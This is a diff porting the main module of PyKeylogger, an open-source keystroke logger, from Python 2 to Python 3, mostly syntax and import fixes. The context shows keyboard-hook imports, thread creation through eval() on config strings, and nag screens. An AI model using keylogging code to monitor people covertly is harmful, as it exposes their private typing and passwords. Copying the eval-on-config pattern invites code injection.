@@ -30,7 +30,7 @@ elif os.name == 'nt':
     import pyHook as hooklib
     import pythoncom
 else:
-    self.logger.error("OS is not recognised as windows or linux.")
+    print("OS is not recognised as windows or linux.")
     exit()
 
 #import imp # don't need this anymore?
@@ -43,9 +43,9 @@ from configobj import ConfigObj, flatten_errors
 from validate import Validator
 from controlpanel import PyKeyloggerControlPanel
 from supportscreen import SupportScreen, ExpirationScreen
-import Tkinter, tkMessageBox
+import tkinter, tkinter.messagebox
 import myutils
-from Queue import Empty, Queue
+from queue import Empty, Queue
 import threading
 import logging
 from myutils import _settings, _cmdoptions, _mainapp
@@ -110,7 +110,7 @@ class KeyLogger:
                 self.event_threads[section] = \
                     eval(self.settings[section]['General']['_Thread_Class'] + \
                     '(self.queues[section], section)')
-            except KeyError:
+            except KeyError as err:
                 self.logger.debug('not creating thread for section %s' % \
                                         section, exc_info=True)
                 pass # this is not a thread to be started.
@@ -158,7 +158,7 @@ class KeyLogger:
         '''Make sure we have the directory where we want to log'''
         try:
             os.makedirs(logdir)
-        except OSError, detail:
+        except OSError as detail:
             if(detail.errno==17):  #if directory already exists, swallow the error
                 pass
             else:
@@ -254,7 +254,7 @@ class KeyLogger:
         for key in self.event_threads.keys():
             self.event_threads[key].cancel()
         
-        #print threading.enumerate()
+        #print(threading.enumerate())
         logging.shutdown()
         time.sleep(0.2) # give all threads time to clean up
         sys.exit()
@@ -326,7 +326,7 @@ class KeyLogger:
                 if error == False:
                     error = 'Missing value or section.'
                 errortext.append('%s: %s' % (section_string, error))
-            tkMessageBox.showerror("Errors in config file. Exiting.", 
+            tkinter.messagebox.showerror("Errors in config file. Exiting.", 
                         '\n\n'.join(errortext))
             sys.exit(1)
 
@@ -345,7 +345,7 @@ class KeyLogger:
         
         if NagMe == True:
             # first, show the support screen
-            root = Tkinter.Tk()
+            root = tkinter.Tk()
             #root.geometry("100x100+200+200")
             root.withdraw()
             warn = SupportScreen(root, title="Please Support PyKeylogger")
@@ -363,7 +363,7 @@ class KeyLogger:
             utfnd = self.settings['General']['_Usage Time Flag']
             if abs(time.time() - float(myutils.password_recover(utfnd))) > \
                3600 * 24 * 4:
-                root = Tkinter.Tk()
+                root = tkinter.Tk()
                 #root.geometry("100x100+200+200")
                 root.withdraw()
                 warn = ExpirationScreen(root, title="PyKeylogger Has Expired")
@@ -399,7 +399,7 @@ class ControlKeyHash:
                                     'Super_r':'Rwin',
                                     'Page_up':'Prior'}
                                     
-        win_lin_dict = dict([(v,k) for (k,v) in lin_win_dict.iteritems()])
+        win_lin_dict = dict([(v,k) for (k,v) in lin_win_dict.items()])
         
         self.controlKeyList = controlkeysetting.split(';')
         
